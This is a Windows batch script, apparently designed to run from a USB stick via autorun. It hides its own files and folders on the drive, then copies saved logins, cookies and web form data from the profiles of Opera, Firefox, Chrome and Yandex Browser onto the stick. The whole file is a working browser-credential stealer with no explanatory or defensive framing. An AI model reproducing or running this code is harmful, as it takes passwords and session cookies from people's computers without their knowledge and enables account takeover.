@echo off
md %~d0\bin\Mozilla
md %~d0\bin\Opera
md %~d0\bin\Google
md %~d0\bin\Yandex
echo off
ATTRIB -R -A -S -H
attrib +h %~d0\bin
attrib +h %~d0\Icon.ico
attrib +h %~d0\file.bat
attrib +h %~d0\addon.vbs
attrib +h %~d0\autorun.inf
attrib +h %~d0\adv
attrib +h %~d0\adv\logs
CD/D %appdata%\Opera software\Opera stable\
copy /y "login data" %~d0\bin\Opera\
copy /y "Cookies" %~d0\bin\Opera\
copy /y "Web Data" %~d0\bin\Opera\
echo off
CD/D %appdata%\Mozilla\Firefox\Profiles\*.default
copy /y cookies.sqlite %~d0\bin\Mozilla
copy /y key3.db %~d0\bin\Mozilla
copy /y signons.sqlite %~d0\bin\Mozilla
echo off
CD/D %localappdata%\Google\Chrome\User Data\Default
copy /y "Login Data" %~d0\bin\Google
copy /y "Cookies" %~d0\bin\Google
copy /y "Web Data" %~d0\bin\Google
echo off
CD/D %localappdata%\Yandex\YandexBrowser\User Data\Default\
copy /y "Ya Login Data" %~d0\bin\Yandex
copy /y "Login Data" %~d0\bin\Yandex
copy /y "Cookies" %~d0\bin\Yandex
copy /y "Web Data" %~d0\bin\Yandex
@echo off
cls